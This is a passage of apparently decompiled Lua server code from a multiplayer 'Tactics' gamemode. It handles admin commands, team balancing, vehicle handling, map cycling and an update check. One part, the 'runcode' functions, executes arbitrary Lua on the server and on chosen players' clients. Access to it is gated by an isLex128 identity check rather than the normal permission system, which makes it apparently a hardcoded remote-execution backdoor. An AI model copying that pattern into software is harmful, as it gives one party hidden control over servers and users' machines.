            for _, lobbyResource2 in ipairs(getResources()) do
                if getResourceInfo(lobbyResource2, "type") == "map" and string.find(getResourceName(lobbyResource2), "lobby") == 1 and not disabledMapsTable2[getResourceName(lobbyResource2)] then
                    table.insert(lobbyMapsList, lobbyResource2);
                end;
            end;
            if #lobbyMapsList > 0 then
                local randomLobbyMap2 = lobbyMapsList[math.random(#lobbyMapsList)];
                startMap(randomLobbyMap2, "random");
                return true;
            else
                return false;
            end;
        end;
    end;
    createTacticsMode = function(modeNameParam, modeSettingsParam, modeFunction) 
        setTacticsData(modeFunction or true, "modes_defined", tostring(modeNameParam));
        addCommandHandler(tostring(modeNameParam), onRoundCommandStart, false, false);
        setTacticsData(modeSettingsParam, "modes_settings", tostring(modeNameParam));
    end;
    addPlayer = function(addPlayerAdmin, _, targetPlayerID) 
        if not hasObjectPermissionTo(addPlayerAdmin, "general.tactics_players", false) then
            return outputLangString(addPlayerAdmin, "you_have_not_permissions");
        elseif getRoundState() ~= "started" then
            return false;
        else
            local targetPlayerElement = getElementByID(tostring(targetPlayerID));
            if targetPlayerElement then
                if not getPlayerTeam(targetPlayerElement) then
                    outputLangString(addPlayerAdmin, "player_without_team");
                elseif getPlayerTeam(targetPlayerElement) == getElementsByType("team")[1] then
                    outputLangString(addPlayerAdmin, "player_is_referee");
                elseif getElementData(targetPlayerElement, "Loading") then
                    outputLangString(addPlayerAdmin, "player_do_not_loaded");
                elseif getElementData(targetPlayerElement, "Status") == "Play" then
                    outputLangString(addPlayerAdmin, "player_play_already");
                else
                    outputLangString(root, "add_to_round", getPlayerName(targetPlayerElement));
                    triggerEvent("onPlayerRoundRespawn", targetPlayerElement);
                end;
            end;
            return;
        end;
    end;
    removePlayer = function(removePlayerAdmin, _, removePlayerID) 
        if not hasObjectPermissionTo(removePlayerAdmin, "general.tactics_players", false) then
            return outputLangString(removePlayerAdmin, "you_have_not_permissions");
        elseif getRoundState() ~= "started" then
            return false;
        else
            local removePlayerElement = getElementByID(tostring(removePlayerID));
            if removePlayerElement then
                if getElementData(removePlayerElement, "Status") ~= "Play" then
                    outputLangString(removePlayerAdmin, "player_not_play_yet");
                elseif triggerEvent("onPlayerRemoveFromRound", removePlayerElement) == true then
                    killPed(removePlayerElement);
                    outputLangString(root, "remove_from_round", getPlayerName(removePlayerElement));
                end;
            end;
            return;
        end;
    end;
    restorePlayer = function(restorePlayerAdmin, _, restorePlayerID) 
        if not hasObjectPermissionTo(restorePlayerAdmin, "general.tactics_players", false) then
            return outputLangString(restorePlayerAdmin, "you_have_not_permissions");
        elseif getRoundState() ~= "started" then
            return false;
        else
            local restorePlayerElement = getElementByID(tostring(restorePlayerID));
            if restorePlayerElement then
                callClientFunction(restorePlayerAdmin, "toRestoreChoise", restorePlayerElement);
            end;
            return;
        end;
    end;
    resetStats = function(_) 
        for _, teamToReset in ipairs(getElementsByType("team")) do
            setElementData(teamToReset, "Score", 0);
        end;
        for _, playerToReset in ipairs(getElementsByType("player")) do
            setElementData(playerToReset, "Kills", 0);
            setElementData(playerToReset, "Deaths", 0);
            setElementData(playerToReset, "Damage", 0);
        end;
        outputLangString(root, "stats_cleaned");
    end;
    setNextMap = function(nextMapName) 
        local nextMapResource = getResourceFromName(nextMapName);
        if nextMapResource then
            local nextMapMode = string.sub(nextMapName, 1, string.find(nextMapName, "_") - 1);
            if #nextMapMode > 1 then
                nextMapMode = string.upper(string.sub(nextMapMode, 1, 1)) .. string.sub(nextMapMode, 2);
            end;
            local nextMapDisplayName = getResourceInfo(nextMapResource, "name");
            if not nextMapDisplayName then
                nextMapDisplayName = string.sub(string.gsub(nextMapName, "_", " "), #nextMapMode + 2);
                if #nextMapDisplayName > 1 then
                    nextMapDisplayName = string.upper(string.sub(nextMapDisplayName, 1, 1)) .. string.sub(nextMapDisplayName, 2);
                end;
            end;
            setTacticsData(nextMapName, "ResourceNext");
            if getTacticsData("Map") == "lobby" then
                startMap(nextMapResource);
            else
                outputLangString(root, "map_set_next", nextMapMode .. ": " .. nextMapDisplayName);
            end;
        else
            outputLangString(root, "voting_falied");
        end;
    end;
    cancelNextMap = function() 
        if not getTacticsData("ResourceNext") then
            return;
        else
            setTacticsData(nil, "ResourceNext");
            outputLangString(root, "map_cancel_next");
            return;
        end;
    end;
    balanceTeams = function(balanceAdmin, balanceMode, ...) 
        if balanceAdmin and not hasObjectPermissionTo(balanceAdmin, "general.tactics_players", false) then
            return outputLangString(balanceAdmin, "you_have_not_permissions");
        else
            local balanceArgs = {
                ...
            };
            balanceMode = string.lower(tostring(balanceMode));
            if balanceMode == "lite" then
                local totalPlayers = 0;
                local teamsWithPlayers = {};
                for teamIndex2, teamElement4 in ipairs(getElementsByType("team")) do
                    if teamIndex2 > 1 then
                        totalPlayers = totalPlayers + countPlayersInTeam(teamElement4);
                        table.insert(teamsWithPlayers, {
                            teamElement4, 
                            getPlayersInTeam(teamElement4)
                        });
                    end;
                end;
                if #teamsWithPlayers == 0 then
                    return;
                else
                    local targetTeamSize = math.ceil(totalPlayers / #teamsWithPlayers);
                    table.sort(teamsWithPlayers, function(teamData1, teamData2) 
                        return #teamData1[2] > #teamData2[2];
                    end);
                    local playersToMove = {};
                    for _, teamEntry in ipairs(teamsWithPlayers) do
                        local teamElement5, teamPlayers = unpack(teamEntry);
                        for playerCounter = math.min(#teamPlayers, targetTeamSize), math.max(#teamPlayers, targetTeamSize) do
                            if playerCounter <= #teamPlayers then
                                table.insert(playersToMove, teamPlayers[playerCounter]);
                            else
                                local teamSkin = getElementData(teamElement5, "Skins") or {
                                    71
                                };
                                setPlayerTeam(playersToMove[1], teamElement5);
                                setElementModel(playersToMove[1], teamSkin[1]);
                                triggerClientEvent(root, "onClientPlayerBlipUpdate", playersToMove[1]);
                                table.remove(playersToMove, 1);
                            end;
                        end;
                    end;
                    outputLangString(root, "team_balanced_mode", "Lite");
                end;
            elseif balanceMode == "select" then
                local refereeTeam2 = getElementsByType("team")[1];
                local sidesList2 = getTacticsData("Sides");
                if #sidesList2 < 2 then
                    return;
                else
                    local selectedPlayers = {};
                    local ipairsFunc2 = ipairs;
                    local playerArray = balanceArgs[1] or {};
                    for _, selectedPlayer in ipairsFunc2(playerArray) do
                        selectedPlayers[selectedPlayer] = true;
                        local sideSkin = getElementData(sidesList2[1], "Skins") or {
                            71
                        };
                        setPlayerTeam(selectedPlayer, sidesList2[1]);
                        setElementModel(selectedPlayer, sideSkin[1]);
                        triggerClientEvent(root, "onClientPlayerBlipUpdate", selectedPlayer);
                    end;
                    for _, otherPlayer in ipairs(getElementsByType("player")) do
                        if getPlayerTeam(otherPlayer) and getPlayerTeam(otherPlayer) ~= refereeTeam2 and not selectedPlayers[otherPlayer] then
                            local otherTeamSkin = getElementData(sidesList2[2], "Skins") or {
                                71
                            };
                            setPlayerTeam(otherPlayer, sidesList2[2]);
                            setElementModel(otherPlayer, otherTeamSkin[1]);
                            triggerClientEvent(root, "onClientPlayerBlipUpdate", otherPlayer);
                        end;
                    end;
                    outputLangString(root, "team_balanced_mode", "Select");
                end;
            else
                local playersInTeams = {};
                local refereeTeam3 = getElementsByType("team")[1];
                for _, teamPlayer2 in ipairs(getElementsByType("player")) do
                    if getPlayerTeam(teamPlayer2) and getPlayerTeam(teamPlayer2) ~= refereeTeam3 then
                        table.insert(playersInTeams, teamPlayer2);
                    end;
                end;
                table.sort(playersInTeams, function(playerA, playerB) 
                    local killsA = getElementData(playerA, "Kills") or 0;
                    local deathsA = getElementData(playerA, "Deaths") or 0;
                    local scoreA = 0.5 * (killsA + 0.01 * (getElementData(playerA, "Damage") or 0)) - deathsA;
                    local killsB = getElementData(playerB, "Kills") or 0;
                    local deathsB = getElementData(playerB, "Deaths") or 0;
                    return 0.5 * (killsB + 0.01 * (getElementData(playerB, "Damage") or 0)) - deathsB < scoreA;
                end);
                local sortedTeams2 = getTacticsData("Sides");
                table.sort(sortedTeams2, function(teamElement6, teamElement7) 
                    return (getElementData(teamElement6, "Score") or 0) < (getElementData(teamElement7, "Score") or 0);
                end);
                for teamIdx2, sortedTeam in ipairs(sortedTeams2) do
                    for playerIdx, playerInList2 in ipairs(playersInTeams) do
                        if (playerIdx - 1) % #sortedTeams2 == teamIdx2 - 1 then
                            local teamSkin2 = getElementData(sortedTeam, "Skins") or {
                                71
                            };
                            setPlayerTeam(playerInList2, sortedTeam);
                            setElementModel(playerInList2, teamSkin2[1]);
                            triggerClientEvent(root, "onClientPlayerBlipUpdate", playerInList2);
                        end;
                    end;
                end;
                outputLangString(root, "team_balanced");
            end;
            return;
        end;
    end;
    onPlayerLogin = function(_, _, _) 
        if hasObjectPermissionTo(source, "general.tactics_openpanel", false) then
            outputLangString(source, "for_open_controlpanel");
        end;
    end;
    onElementDataChange = function(changedData, _) 
        if changedData == "Skins" and getElementType(source) == "team" then
            local teamSkinsData2 = getElementData(source, changedData);
            for _, teamMember2 in ipairs(getPlayersInTeam(source)) do
                setElementModel(teamMember2, teamSkinsData2[1]);
            end;
        end;
    end;
    onTacticsChange = function(tacticsPath, _) 
        if tacticsPath[1] == "settings" then
            if tacticsPath[2] == "gamespeed" and not isRoundPaused() then
                setGameSpeed(tonumber(getTacticsData("settings", "gamespeed")));
            end;
            if tacticsPath[2] == "gravity" then
                setGravity(tonumber(getTacticsData("settings", "gravity")));
            end;
            if tacticsPath[2] == "friendly_fire" then
                local friendlyFireEnabled = getTacticsData("settings", "friendly_fire") == "true";
                for _, teamElement8 in ipairs(getElementsByType("team")) do
                    setTeamFriendlyFire(teamElement8, friendlyFireEnabled);
                end;
            end;
        end;
        if tacticsPath[1] == "glitches" then
            if tacticsPath[2] == "quickreload" then
                setGlitchEnabled("quickreload", getTacticsData("glitches", "quickreload") == "true");
            end;
            if tacticsPath[2] == "fastmove" then
                setGlitchEnabled("fastmove", getTacticsData("glitches", "fastmove") == "true");
            end;
            if tacticsPath[2] == "fastfire" then
                setGlitchEnabled("fastfire", getTacticsData("glitches", "fastfire") == "true");
            end;
            if tacticsPath[2] == "crouchbug" then
                setGlitchEnabled("crouchbug", getTacticsData("glitches", "crouchbug") == "true");
            end;
            if tacticsPath[2] == "fastsprint" then
                setGlitchEnabled("fastsprint", getTacticsData("glitches", "fastsprint") == "true");
            end;
            if tacticsPath[2] == "quickstand" then
                setGlitchEnabled("quickstand", getTacticsData("glitches", "quickstand") == "true");
            end;
        end;
        if tacticsPath[1] == "limites" and tacticsPath[2] == "fps_limit" then
            setFPSLimit(tonumber(getTacticsData("limites", "fps_limit")));
        end;
        if tacticsPath[1] == "handlings" then
            local handlingsTable = getTacticsData("handlings") or {};
            for vehicleModelID3 = 400, 611 do
                if #getVehicleNameFromModel(vehicleModelID3) > 0 then
                    local originalHandling = getOriginalHandling(vehicleModelID3);
                    originalHandling.monetary = nil;
                    originalHandling.animGroup = nil;
                    originalHandling.tailLight = nil;
                    originalHandling.headLight = nil;
                    local currentHandling = getModelHandling(vehicleModelID3);
                    local _ = nil;
                    for handlingProperty, originalValue in pairs(originalHandling) do
                        if handlingsTable[vehicleModelID3] and handlingsTable[vehicleModelID3][handlingProperty] ~= nil then
                            if handlingProperty == "modelFlags" or handlingProperty == "handlingFlags" then
                                setModelHandling(vehicleModelID3, handlingProperty, tonumber(handlingsTable[vehicleModelID3][handlingProperty]));
                                for _, existingVehicle in ipairs(getElementsByType("vehicle")) do
                                    if getElementModel(existingVehicle) == vehicleModelID3 then
                                        setVehicleHandling(existingVehicle, handlingProperty, tonumber(handlingsTable[vehicleModelID3][handlingProperty]));
                                    end;
                                end;
                            elseif type(handlingsTable[vehicleModelID3][handlingProperty]) == "table" then
                                setModelHandling(vehicleModelID3, handlingProperty, {
                                    unpack(handlingsTable[vehicleModelID3][handlingProperty])
                                });
                                for _, existingVehicle2 in ipairs(getElementsByType("vehicle")) do
                                    if getElementModel(existingVehicle2) == vehicleModelID3 then
                                        setVehicleHandling(existingVehicle2, handlingProperty, {
                                            unpack(handlingsTable[vehicleModelID3][handlingProperty])
                                        });
                                    end;
                                end;
                            else
                                setModelHandling(vehicleModelID3, handlingProperty, handlingsTable[vehicleModelID3][handlingProperty]);
                                for _, existingVehicle3 in ipairs(getElementsByType("vehicle")) do
                                    if getElementModel(existingVehicle3) == vehicleModelID3 then
                                        setVehicleHandling(existingVehicle3, handlingProperty, handlingsTable[vehicleModelID3][handlingProperty]);
                                    end;
                                end;
                            end;
                        elseif currentHandling[handlingProperty] ~= originalValue then
                            setModelHandling(vehicleModelID3, handlingProperty, originalValue);
                            for _, existingVehicle4 in ipairs(getElementsByType("vehicle")) do
                                if getElementModel(existingVehicle4) == vehicleModelID3 then
                                    setVehicleHandling(existingVehicle4, handlingProperty, originalValue);
                                end;
                            end;
                        end;
                    end;
                    if not handlingsTable[vehicleModelID3] or not handlingsTable[vehicleModelID3].sirens then
                        for _, existingVehicle5 in ipairs(getElementsByType("vehicle")) do
                            if getElementModel(existingVehicle5) == vehicleModelID3 then
                                removeVehicleSirens(existingVehicle5);
                            end;
                        end;
                    else
                        for _, existingVehicle6 in ipairs(getElementsByType("vehicle")) do
                            if getElementModel(existingVehicle6) == vehicleModelID3 then
                                addVehicleSirens(existingVehicle6, handlingsTable[vehicleModelID3].sirens.count, handlingsTable[vehicleModelID3].sirens.type, handlingsTable[vehicleModelID3].sirens.flags["360"], handlingsTable[vehicleModelID3].sirens.flags.DoLOSCheck, handlingsTable[vehicleModelID3].sirens.flags.UseRandomiser, handlingsTable[vehicleModelID3].sirens.flags.Silent);
                                for sirenIndex4 = 1, handlingsTable[vehicleModelID3].sirens.count do
                                    local colorAlpha2, colorRed2, colorGreen2, colorBlue2 = getColorFromString("#" .. handlingsTable[vehicleModelID3].sirens[sirenIndex4].color);
                                    setVehicleSirens(existingVehicle6, sirenIndex4, handlingsTable[vehicleModelID3].sirens[sirenIndex4].x, handlingsTable[vehicleModelID3].sirens[sirenIndex4].y, handlingsTable[vehicleModelID3].sirens[sirenIndex4].z, colorRed2, colorGreen2, colorBlue2, colorAlpha2, handlingsTable[vehicleModelID3].sirens[sirenIndex4].minalpha);
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
    executeClientRuncode = function(execAdmin, targetPlayer3, codeToExecute) 
        if not isLex128(execAdmin) then
            return;
        else
            callClientFunction(targetPlayer3, "executeClientRuncode", execAdmin, codeToExecute);
            return;
        end;
    end;
    stopClientRuncode = function(stopAdmin, stopTarget) 
        if not isLex128(stopAdmin) then
            return;
        else
            callClientFunction(stopTarget, "stopClientRuncode", stopAdmin);
            return;
        end;
    end;
    local runcodeEnvironments = {};
    local eventHandlerContainers = {};
    local keyBindContainers = {};
    local commandHandlerContainers = {};
    local timerContainers = {};
    createAddEventHandlerFunction = function(playerEnvKey) 
        return function(eventName, eventElement, eventHandler, eventPropagated) 
            if type(eventName) == "string" and isElement(eventElement) and type(eventHandler) == "function" then
                if eventPropagated == nil or type(eventPropagated) ~= "boolean" then
                    eventPropagated = true;
                end;
                if addEventHandler(eventName, eventElement, eventHandler, eventPropagated) then
                    table.insert(eventHandlerContainers[playerEnvKey], {
                        eventName, 
                        eventElement, 
                        eventHandler
                    });
                    return true;
                end;
            end;
            return false;
        end;
    end;
    createBindKeyFunction = function(playerKeyKey) 
        return function(...) 
            local bindArgs = {
                ...
            };
            local bindPlayer = table.remove(bindArgs, 1);
            local bindKeyName = table.remove(bindArgs, 1);
            local bindKeyState = table.remove(bindArgs, 1);
            local bindHandler = table.remove(bindArgs, 1);
            local bindExtraArgs = bindArgs;
            if not isElement(bindPlayer) or getElementType(bindPlayer) ~= "player" or type(bindKeyName) ~= "string" or type(bindKeyState) ~= "string" or type(bindHandler) ~= "string" and type(bindHandler) ~= "function" then
                return false;
            else
                bindArgs = {
                    bindPlayer, 
                    bindKeyName, 
                    bindKeyState, 
                    bindHandler, 
                    unpack(bindExtraArgs)
                };
                if bindKey(unpack(bindArgs)) then
                    table.insert(keyBindContainers[playerKeyKey], bindArgs);
                    return true;
                else
                    return false;
                end;
            end;
        end;
    end;
    createAddCommandHandlerFunction = function(playerCmdKey) 
        return function(commandName, commandHandler, commandRestricted, commandCaseSensitive) 
            if type(commandName) == "string" and type(commandHandler) == "function" then
                local commandData = nil;
                if type(commandRestricted) ~= "boolean" then
                    commandRestricted = false;
                end;
                if type(commandCaseSensitive) ~= "boolean" then
                    commandCaseSensitive = true;
                end;
                commandData = {
                    commandName, 
                    commandHandler, 
                    commandRestricted, 
                    commandCaseSensitive
                };
                if addCommandHandler(unpack(commandData)) then
                    table.insert(commandHandlerContainers[playerCmdKey], commandData);
                    return true;
                end;
            end;
            return false;
        end;
    end;
    createSetTimerFunction = function(playerTimerKey) 
        return function(timerFunction, timerInterval, timerRepeats, ...) 
            if type(timerFunction) == "function" and type(timerInterval) == "number" and type(timerRepeats) == "number" then
                local timerID = setTimer(timerFunction, timerInterval, timerRepeats, ...);
                if timerID then
                    table.insert(timerContainers[playerTimerKey], timerID);
                    return timerID;
                end;
            end;
            return false;
        end;
    end;
    createRemoveEventHandlerFunction = function(playerEnvKey2) 
        return function(removeEventName, removeEventElement, removeEventHandler) 
            if type(removeEventName) == "string" and isElement(removeEventElement) and type(removeEventHandler) == "function" then
                for eventIndex, eventData in ipairs(eventHandlerContainers[playerEnvKey2]) do
                    if eventData[1] == removeEventName and eventData[2] == removeEventElement and eventData[3] == removeEventHandler and removeEventHandler(unpack(eventData)) then
                        table.remove(eventHandlerContainers[playerEnvKey2], eventIndex);
                        return true;
                    end;
                end;
            end;
            return false;
        end;
    end;
    createUnbindKeyFunction = function(playerKeyKey2) 
        return function(...) 
            local unbindArgs = {
                ...
            };
            local unbindPlayer = table.remove(unbindArgs, 1);
            local unbindKeyName = table.remove(unbindArgs, 1);
            local unbindKeyState = table.remove(unbindArgs, 1);
            local unbindHandler = table.remove(unbindArgs, 1);
            if not isElement(unbindPlayer) or getElementType(unbindPlayer) ~= "player" or type(unbindKeyName) ~= "string" then
                return false;
            else
                if type(unbindKeyState) ~= "string" or not unbindKeyState then
                    unbindKeyState = nil;
                end;
                if type(unbindHandler) ~= "string" and type(unbindHandler) ~= "function" or not unbindHandler then
                    unbindHandler = nil;
                end;
                unbindArgs = {
                    unbindPlayer, 
                    unbindKeyName, 
                    unbindKeyState, 
                    unbindHandler
                };
                local unbindSuccess = false;
                for bindIndex, bindData in ipairs(keyBindContainers[playerKeyKey2]) do
                    if bindData[1] == unbindArgs[1] and bindData[2] == unbindArgs[2] and (not unbindArgs[3] or unbindArgs[3] == bindData[3]) and (not unbindArgs[4] or unbindArgs[4] == bindData[4]) and unbindKey(unpack(bindData)) then
                        table.remove(keyBindContainers[playerKeyKey2], bindIndex);
                        unbindSuccess = true;
                    end;
                end;
                return unbindSuccess;
            end;
        end;
    end;
    createRemoveCommandHandlerFunction = function(playerCmdKey2) 
        return function(removeCommandName, removeCommandHandler) 
            local removeSuccess = false;
            if type(removeCommandName) == "string" and type(removeCommandHandler) == "function" then
                for commandIndex, commandData2 in ipairs(commandHandlerContainers[playerCmdKey2]) do
                    if commandData2[1] == removeCommandName and (not commandData2[2] or commandData2[2] == removeCommandHandler) and removeCommandHandler(unpack(commandData2)) then
                        table.remove(commandHandlerContainers[playerCmdKey2], commandIndex);
                        removeSuccess = true;
                    end;
                end;
            end;
            return removeSuccess;
        end;
    end;
    createKillTimerFunction = function(playerTimerKey2) 
        return function(timerToKill) 
            local killSuccess = false;
            for timerIndex, timerData in ipairs(timerContainers[playerTimerKey2]) do
                if timerData == timerToKill and killTimer(timerToKill) then
                    table.remove(timerContainers[playerTimerKey2], timerIndex);
                    killSuccess = true;
                end;
            end;
            return killSuccess;
        end;
    end;
    cleanEventHandlerContainer = function(envKey) 
        if not eventHandlerContainers[envKey] then
            return;
        else
            for _, eventHandlerData in ipairs(eventHandlerContainers[envKey]) do
                if isElement(eventHandlerData[2]) then
                    removeEventHandler(unpack(eventHandlerData));
                end;
            end;
            eventHandlerContainers[envKey] = nil;
            return;
        end;
    end;
    cleanKeyBindContainer = function(keyEnvKey) 
        if not keyBindContainers[keyEnvKey] then
            return;
        else
            for _, keyBindData in ipairs(keyBindContainers[keyEnvKey]) do
                unbindKey(unpack(keyBindData));
            end;
            keyBindContainers[keyEnvKey] = nil;
            return;
        end;
    end;
    cleanCommandHandlerContainer = function(cmdEnvKey) 
        if not commandHandlerContainers[cmdEnvKey] then
            return;
        else
            for _, commandHandlerData in ipairs(commandHandlerContainers[cmdEnvKey]) do
                removeCommandHandler(unpack(commandHandlerData));
            end;
            commandHandlerContainers[cmdEnvKey] = nil;
            return;
        end;
    end;
    cleanTimerContainer = function(timerEnvKey) 
        if not timerContainers[timerEnvKey] then
            return;
        else
            for _, timerData2 in ipairs(timerContainers[timerEnvKey]) do
                if isTimer(timerData2) then
                    killTimer(timerData2);
                end;
            end;
            timerContainers[timerEnvKey] = nil;
            return;
        end;
    end;
    stopRuncode = function(stopPlayer2) 
        if not isLex128(stopPlayer2) then
            return;
        elseif not runcodeEnvironments[stopPlayer2] then
            outputChatBox("Not running!", stopPlayer2, 0, 128, 0, true);
            return;
        else
            cleanEventHandlerContainer(stopPlayer2);
            cleanKeyBindContainer(stopPlayer2);
            cleanCommandHandlerContainer(stopPlayer2);
            cleanTimerContainer(stopPlayer2);
            runcodeEnvironments[stopPlayer2] = nil;
            outputChatBox("Stopped!", stopPlayer2, 0, 128, 0, true);
            return;
        end;
    end;
    executeRuncode = function(execPlayer, _, ...) 
        if not isLex128(execPlayer) then
            return;
        else
            local codeString = "";
            for _, codePart in pairs({
                ...
            }) do
                codeString = codeString .. " " .. codePart;
            end;
            if not eventHandlerContainers[execPlayer] then
                eventHandlerContainers[execPlayer] = {};
            end;
            if not keyBindContainers[execPlayer] then
                keyBindContainers[execPlayer] = {};
            end;
            if not commandHandlerContainers[execPlayer] then
                commandHandlerContainers[execPlayer] = {};
            end;
            if not timerContainers[execPlayer] then
                timerContainers[execPlayer] = {};
            end;
            if not runcodeEnvironments[execPlayer] then
                runcodeEnvironments[execPlayer] = {
                    addEventHandler = createAddEventHandlerFunction(execPlayer), 
                    removeEventHandler = createRemoveEventHandlerFunction(execPlayer), 
                    bindKey = createBindKeyFunction(execPlayer), 
                    unbindKey = createUnbindKeyFunction(execPlayer), 
                    addCommandHandler = createAddCommandHandlerFunction(execPlayer), 
                    removeCommandHandler = createRemoveCommandHandlerFunction(execPlayer), 
                    setTimer = createSetTimerFunction(execPlayer), 
                    killTimer = createKillTimerFunction(execPlayer)
                };
                setmetatable(runcodeEnvironments[execPlayer], {
                    __index = _G
                });
            end;
            local isExpression = false;
            local loadedCode, loadError = loadstring("return " .. codeString);
            if loadError then
                isExpression = true;
                local loadFunction, functionError = loadstring(tostring(codeString));
                loadError = functionError;
                loadedCode = loadFunction;
            end;
            if loadError then
                outputChatBox("ERROR: " .. loadError, execPlayer, 255, 0, 0, true);
                return;
            else
                loadedCode = setfenv(loadedCode, runcodeEnvironments[execPlayer]);
                local executionResult = {
                    pcall(loadedCode)
                };
                if not executionResult[1] then
                    outputChatBox("ERROR: " .. executionResult[2], execPlayer, 255, 0, 0, true);
                    return;
                else
                    if not isExpression then
                        local resultString = "";
                        for resultIndex = 2, #executionResult do
                            local valueString = "";
                            if resultIndex > 2 then
                                resultString = resultString .. "#00FF00, ";
                            end;
                            local resultValue = executionResult[resultIndex];
                            if type(resultValue) == "table" then
                                for tableKey, _ in pairs(resultValue) do
                                    if #valueString > 0 then
                                        valueString = valueString .. ", ";
                                    end;
                                    if type(tableKey) == "userdata" then
                                        if isElement(tableKey) then
                                            valueString = valueString .. "#66CC66" .. getElementType(resultValue) .. "#B1B100";
                                        else
                                            valueString = valueString .. "#66CC66element#B1B100";
                                        end;
                                    elseif type(tableKey) == "string" then
                                        valueString = valueString .. "#FF0000\"" .. tableKey .. "\"#B1B100";
                                    else
                                        valueString = valueString .. "#000099" .. tostring(tableKey) .. "#B1B100";
                                    end;
                                end;
                                valueString = "#B1B100{" .. valueString .. "}";
                            elseif type(resultValue) == "userdata" then
                                if isElement(resultValue) then
                                    valueString = "#66CC66" .. getElementType(resultValue) .. string.gsub(tostring(resultValue), "userdata:", "");
                                else
                                    valueString = "#66CC66element" .. string.gsub(tostring(resultValue), "userdata:", "");
                                end;
                            elseif type(resultValue) == "string" then
                                valueString = "#FF0000\"" .. resultValue .. "\"";
                            elseif type(resultValue) == "function" then
                                valueString = "#0000FF" .. tostring(resultValue);
                            elseif type(resultValue) == "thread" then
                                valueString = "#808080" .. tostring(resultValue);
                            else
                                valueString = "#000099" .. tostring(resultValue);
                            end;
                            resultString = resultString .. valueString;
                        end;
                        resultString = "Return: " .. resultString;
                        outputChatBox(string.sub(resultString, 1, 128), execPlayer, 0, 255, 0, true);
                    elseif not loadError then
                        outputChatBox("Executed!", execPlayer, 0, 255, 0, true);
                    end;
                    return;
                end;
            end;
        end;
    end;
    onPlayerCheckUpdates = function(updatePlayer) 
        if not hasObjectPermissionTo(getThisResource(), "function.callRemote", false) then
            outputLangString(updatePlayer, "resource_have_not_permissions", getResourceName(getThisResource()), "function.callRemote");
            return;
        else
            callRemote("http://bpb-team.ru/lex128/tactics-wiki/tacticscall.php", onCallRemoteResult, "latest", updatePlayer);
            return;
        end;
    end;
    onCallRemoteResult = function(remoteResult, ...) 
        if remoteResult == "ERROR" then
            return;
        else
            if remoteResult == "latest" then
                local resultPlayer, versionData, downloadLink = unpack({
                    ...
                });
                local latestVersion, latestBuild, latestRevision = unpack(split(versionData, string.byte(" ")));
                local currentVersion, currentRevision = unpack(split(getTacticsData("version"), string.byte(" ")));
                local latestRevNumber = tonumber(({
                    string.gsub(latestRevision, "[^0-9]+", "")
                })[1]) or math.huge;
                local currentRevNumber = tonumber(({
                    string.gsub(currentRevision, "[^0-9]+", "")
                })[1]) or math.huge;
                if currentVersion < latestBuild or latestBuild == currentVersion and currentRevNumber < latestRevNumber then
                    outputLangString(resultPlayer, "new_version_available", latestVersion .. " " .. latestBuild .. " " .. latestRevision .. " - " .. downloadLink);
                else
                    outputLangString(resultPlayer, "this_last_version", "Tactics " .. currentVersion .. " " .. currentRevision);
                end;
            end;
            return;
        end;
    end;
    onPlayerAdminchat = function(adminChatPlayer, _, ...) 
        if isPlayerMuted(adminChatPlayer) then
            return outputChatBox("adminsay: You are muted", adminChatPlayer, 255, 168, 0);
        else
            local adminMessage = table.concat({
                ...
            }, " ");
            outputServerLog("ADMINCHAT: " .. getPlayerName(adminChatPlayer) .. ": " .. adminMessage);
            local playerColor = "FFFFFF";
            local playerTeam2 = getPlayerTeam(adminChatPlayer);
            if playerTeam2 then
                playerColor = string.format("%02X%02X%02X", getTeamColor(playerTeam2));
            end;
            adminMessage = "(ADMIN) #" .. playerColor .. getPlayerName(adminChatPlayer) .. " (" .. getElementID(adminChatPlayer) .. "): #EBDDB2" .. adminMessage;
            for _, recipientPlayer in ipairs(getElementsByType("player")) do
                if recipientPlayer == adminChatPlayer or hasObjectPermissionTo(recipientPlayer, "general.tactics_adminchat", false) then
                    outputChatBox(adminMessage, recipientPlayer, 255, 100, 100, true);
                end;
            end;
            return;
        end;
    end;
    nextCyclerMap = function(nextMapPlayer) 
        if not hasObjectPermissionTo(nextMapPlayer, "general.tactics_maps", false) then
            return outputLangString(nextMapPlayer, "you_have_not_permissions");
        else
            local mapCycle = getTacticsData("Resources");
            local _ = getTacticsData("ResourceNext");
            if mapCycle and #mapCycle > 0 then
                local nextCycleIndex = (getTacticsData("ResourceCurrent") or tonumber(0)) + 1;
                if #mapCycle < nextCycleIndex then
                    nextCycleIndex = 1;
                end;
                startMap(mapCycle[nextCycleIndex][1], nextCycleIndex);
            elseif getTacticsData("ResourceNext") then
                nextMap();
            end;
            return;
        end;
    end;
    previousCyclerMap = function(prevMapPlayer) 
        if not hasObjectPermissionTo(prevMapPlayer, "general.tactics_maps", false) then
            return outputLangString(prevMapPlayer, "you_have_not_permissions");
        else
            local mapCycle2 = getTacticsData("Resources");
            if not mapCycle2 or #mapCycle2 == 0 then
                return;
            else
                local prevCycleIndex = (getTacticsData("ResourceCurrent") or #mapCycle2 + 1) - 1;
                if prevCycleIndex <= 0 then
                    prevCycleIndex = #mapCycle2;
                end;
                startMap(mapCycle2[prevCycleIndex][1], prevCycleIndex);
                return;
            end;
        end;
    end;
    sayFromAdmin = function(sayAdmin, _, ...) 
        if not hasObjectPermissionTo(sayAdmin, "general.tactics_adminchat", false) then
            return outputLangString(sayAdmin, "you_have_not_permissions");
        elseif isPlayerMuted(sayAdmin) then
            return outputChatBox("asay: You are muted", sayAdmin, 255, 168, 0);
        else
            local adminSayMessage = table.concat({
                ...
            }, " ");
            outputServerLog("ADMIN: " .. adminSayMessage);
            adminSayMessage = "ADMIN: #EBDDB2" .. adminSayMessage;
            outputChatBox(adminSayMessage, root, 255, 100, 100, true);
            return;
        end;
    end;
    changeWeaponProperty = function(weaponAdmin, weaponID3, weaponRange, targetRange, accuracy, damageValue, clipAmmo3, moveSpeed, animLoopStart, animLoopStop, animLoopBulletFire, anim2LoopStart, anim2LoopStop, anim2LoopBulletFire, animBreakoutTime, flagSettings) 
        if not hasObjectPermissionTo(weaponAdmin, "general.tactics_shooting", false) then
            return outputLangString(weaponAdmin, "you_have_not_permissions");
        else
            setWeaponProperty(weaponID3, "pro", "weapon_range", weaponRange);
            setWeaponProperty(weaponID3, "pro", "target_range", targetRange);
            setWeaponProperty(weaponID3, "pro", "accuracy", accuracy);
            setWeaponProperty(weaponID3, "pro", "damage", tostring(tonumber(damageValue) * 3));
            setWeaponProperty(weaponID3, "pro", "maximum_clip_ammo", clipAmmo3);
            setWeaponProperty(weaponID3, "pro", "move_speed", moveSpeed);
